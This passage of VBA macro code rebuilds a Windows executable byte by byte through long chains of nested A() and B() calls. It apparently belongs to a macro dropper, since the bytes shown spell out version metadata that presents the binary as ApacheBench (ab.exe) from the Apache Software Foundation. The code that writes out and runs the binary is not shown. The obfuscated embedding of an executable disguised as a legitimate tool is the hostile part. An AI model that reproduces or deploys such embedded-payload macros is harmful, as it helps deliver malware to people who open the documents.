    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 16), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 24), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 1), 0), 0), 0), "0"), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 9), 4), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "H"), 0), 0), 0), "`P"), 1), 0), "h"), 7), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "h"), 7), "4"), 0), 0), 0), "V"), 0), "S"), 0), "_"), 0), "V"), 0), "E"), 0), "R"), 0), "S"), 0), "I"), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "O"), 0), "N"), 0), "_"), 0), "I"), 0), "N"), 0), "F"), 0), "O"), 0), 0), 0), 0), 0), 189), 4), 239), 254), 0), 0), 1), 0), 2), 0), 2), 0), 0), 0), 14), 0), 2), 0), 2), 0), 0), 0), 14), 0), "?"), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 4), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 198), 6), 0), 0), 1), 0), "S"), 0), "t"), 0), "r"), 0), "i"), 0), "n"), 0), "g"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "I"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "f"), 0), "o"), 0), 0), 0), 162), 6), 0), 0), 1), 0), "0"), 0), "4"), 0), "0"), 0), "9"), 0), "0"), 0), "4"), 0), "b"), 0), "0"), 0), 0), 0), "0"), 4), 12), 2), 1), 0), "C"), 0), "o"), 0), "m"), 0), "m"), 0), "e"), 0), "n"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "s"), 0), 0), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), "d"), 0), " "), 0), "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), ","), 0), " "), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), " "), 0), "2"), 0), "."), 0), "0"), 0), " "), 0), "("), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(strPE, "t"), 0), "h"), 0), "e"), 0), " "), 0), 34), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), 34), 0), ")"), 0), ";"), 0), " "), 0), "y"), 0), "o"), 0), "u"), 0), " "), 0), "m"), 0), "a"), 0), "y"), 0), " "), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "o"), 0), "t"), 0), " "), 0), "u"), 0), "s"), 0), "e"), 0), " "), 0), "t"), 0), "h"), 0), "i"), 0), "s"), 0), " "), 0), "f"), 0), "i"), 0), "l"), 0), "e"), 0), " "), 0), "e"), 0), "x"), 0), "c"), 0), "e"), 0), "p"), 0), "t"), 0), " "), 0), "i"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), " "), 0), "c"), 0), "o"), 0), "m"), 0), "p"), 0), "l"), 0), "i"), 0), "a"), 0), "n"), 0), "c"), 0), "e"), 0), " "), 0), "w"), 0), "i"), 0), "t"), 0), "h"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "e"), 0), "n"), 0), "s"), 0), "e"), 0), "."), 0), " "), 0), "Y"), 0), "o"), 0), "u"), 0), " "), 0), "m"), 0), "a"), 0), "y"), 0), " "), 0), "o"), 0), "b"), 0), "t"), 0), "a"), 0), "i"), 0), "n"), 0), " "), 0), "a"), 0), " "), 0), "c"), 0), "o"), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "p"), 0), "y"), 0), " "), 0), "o"), 0), "f"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "a"), 0), "t"), 0), 13), 0), 10), 0), 13), 0), 10), 0), "h"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "t"), 0), "t"), 0), "p"), 0), ":"), 0), "/"), 0), "/"), 0), "w"), 0), "w"), 0), "w"), 0), "."), 0), "a"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), "."), 0), "o"), 0), "r"), 0), "g"), 0), "/"), 0), "l"), 0), "i"), 0), "c"), 0), "e"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "s"), 0), "e"), 0), "s"), 0), "/"), 0), "L"), 0), "I"), 0), "C"), 0), "E"), 0), "N"), 0), "S"), 0), "E"), 0), "-"), 0), "2"), 0), "."), 0), "0"), 0), 13), 0), 10), 0), 13), 0), 10), 0), "U"), 0), "n"), 0), "l"), 0), "e"), 0), "s"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "s"), 0), " "), 0), "r"), 0), "e"), 0), "q"), 0), "u"), 0), "i"), 0), "r"), 0), "e"), 0), "d"), 0), " "), 0), "b"), 0), "y"), 0), " "), 0), "a"), 0), "p"), 0), "p"), 0), "l"), 0), "i"), 0), "c"), 0), "a"), 0), "b"), 0), "l"), 0), "e"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "l"), 0), "a"), 0), "w"), 0), " "), 0), "o"), 0), "r"), 0), " "), 0), "a"), 0), "g"), 0), "r"), 0), "e"), 0), "e"), 0), "d"), 0), " "), 0), "t"), 0), "o"), 0), " "), 0), "i"), 0), "n"), 0), " "), 0), "w"), 0), "r"), 0), "i"), 0), "t"), 0), "i"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "g"), 0), ","), 0), " "), 0), "s"), 0), "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0), "d"), 0), "i"), 0), "s"), 0), "t"), 0), "r"), 0), "i"), 0), "b"), 0), "u"), 0), "t"), 0), "e"), 0), "d"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "i"), 0), "s"), 0), " "), 0), "d"), 0), "i"), 0), "s"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "r"), 0), "i"), 0), "b"), 0), "u"), 0), "t"), 0), "e"), 0), "d"), 0), " "), 0), "o"), 0), "n"), 0), " "), 0), "a"), 0), "n"), 0), " "), 0), 34), 0), "A"), 0), "S"), 0), " "), 0), "I"), 0), "S"), 0), 34), 0), " "), 0), "B"), 0), "A"), 0), "S"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "I"), 0), "S"), 0), ","), 0), " "), 0), "W"), 0), "I"), 0), "T"), 0), "H"), 0), "O"), 0), "U"), 0), "T"), 0), " "), 0), "W"), 0), "A"), 0), "R"), 0), "R"), 0), "A"), 0), "N"), 0), "T"), 0), "I"), 0), "E"), 0), "S"), 0), " "), 0), "O"), 0), "R"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, " "), 0), "C"), 0), "O"), 0), "N"), 0), "D"), 0), "I"), 0), "T"), 0), "I"), 0), "O"), 0), "N"), 0), "S"), 0), " "), 0), "O"), 0), "F"), 0), " "), 0), "A"), 0), "N"), 0), "Y"), 0), " "), 0), "K"), 0), "I"), 0), "N"), 0), "D"), 0), ","), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "e"), 0), "i"), 0), "t"), 0), "h"), 0), "e"), 0), "r"), 0), " "), 0), "e"), 0), "x"), 0), "p"), 0), "r"), 0), "e"), 0), "s"), 0), "s"), 0), " "), 0), "o"), 0), "r"), 0), " "), 0), "i"), 0), "m"), 0), "p"), 0), "l"), 0), "i"), 0), "e"), 0), "d"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "."), 0), " "), 0), "S"), 0), "e"), 0), "e"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "f"), 0), "o"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, " "), 0), "s"), 0), "p"), 0), "e"), 0), "c"), 0), "i"), 0), "f"), 0), "i"), 0), "c"), 0), " "), 0), "l"), 0), "a"), 0), "n"), 0), "g"), 0), "u"), 0), "a"), 0), "g"), 0), "e"), 0), " "), 0), "g"), 0), "o"), 0), "v"), 0), "e"), 0), "r"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "i"), 0), "n"), 0), "g"), 0), " "), 0), "p"), 0), "e"), 0), "r"), 0), "m"), 0), "i"), 0), "s"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), "s"), 0), " "), 0), "a"), 0), "n"), 0), "d"), 0), " "), 0), "l"), 0), "i"), 0), "m"), 0), "i"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), "s"), 0), " "), 0), "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), "."), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 0), 0), "V"), 0), 27), 0), 1), 0), "C"), 0), "o"), 0), "m"), 0), "p"), 0), "a"), 0), "n"), 0), "y"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "S"), 0)
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0), "F"), 0), "o"), 0), "u"), 0), "n"), 0), "d"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "j"), 0), "!"), 0), 1), 0), "F"), 0), "i"), 0)

    PE28 = strPE
End Function

Private Function PE29() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "l"), 0), "e"), 0), "D"), 0), "e"), 0), "s"), 0), "c"), 0), "r"), 0), "i"), 0), "p"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), "B"), 0), "e"), 0), "n"), 0), "c"), 0)
    strPE = A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "h"), 0), " "), 0), "c"), 0), "o"), 0), "m"), 0), "m"), 0), "a"), 0), "n"), 0), "d"), 0), " "), 0), "l"), 0), "i"), 0), "n"), 0), "e"), 0), " "), 0), "u"), 0), "t"), 0), "i"), 0), "l"), 0), "i"), 0), "t"), 0), "y"), 0), 0), 0), 0), 0), "."), 0)
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 7), 0), 1), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "2"), 0), "."), 0), "2"), 0), "."), 0), "1"), 0), "4"), 0), 0), 0), 0), 0), "."), 0), 7), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 1), 0), "I"), 0), "n"), 0), "t"), 0), "e"), 0), "r"), 0), "n"), 0), "a"), 0), "l"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "a"), 0), "b"), 0), "."), 0), "e"), 0), "x"), 0), "e"), 0), 0), 0), 0), 0), 130), 0), "/"), 0), 1), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "L"), 0), "e"), 0), "g"), 0), "a"), 0), "l"), 0), "C"), 0), "o"), 0), "p"), 0), "y"), 0), "r"), 0), "i"), 0), "g"), 0), "h"), 0), "t"), 0), 0), 0), "C"), 0), "o"), 0), "p"), 0), "y"), 0), "r"), 0), "i"), 0), "g"), 0), "h"), 0), "t"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "2"), 0), "0"), 0), "0"), 0), "9"), 0), " "), 0), "T"), 0), "h"), 0), "e"), 0), " "), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "S"), 0), "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "F"), 0), "o"), 0), "u"), 0), "n"), 0), "d"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), "."), 0), 0), 0), 0), 0), "6"), 0), 7), 0), 1), 0), "O"), 0), "r"), 0), "i"), 0), "g"), 0), "i"), 0), "n"), 0), "a"), 0), "l"), 0), "F"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "i"), 0), "l"), 0), "e"), 0), "n"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "a"), 0), "b"), 0), "."), 0), "e"), 0), "x"), 0), "e"), 0), 0), 0), 0), 0), "F"), 0), 19), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "t"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "H"), 0), "T"), 0), "T"), 0), "P"), 0), " "), 0), "S"), 0), "e"), 0), "r"), 0), "v"), 0), "e"), 0), "r"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "2"), 0), 7), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0), "t"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), "2"), 0), "."), 0), "2"), 0), "."), 0), "1"), 0)
    strPE = A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "4"), 0), 0), 0), 0), 0), "D"), 0), 0), 0), 1), 0), "V"), 0), "a"), 0), "r"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "I"), 0), "n"), 0), "f"), 0), "o"), 0), 0), 0), 0), 0), "$"), 0), 4), 0), 0), 0), "T"), 0), "r"), 0), "a"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "s"), 0), "l"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), 9), 4), 176), 4), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
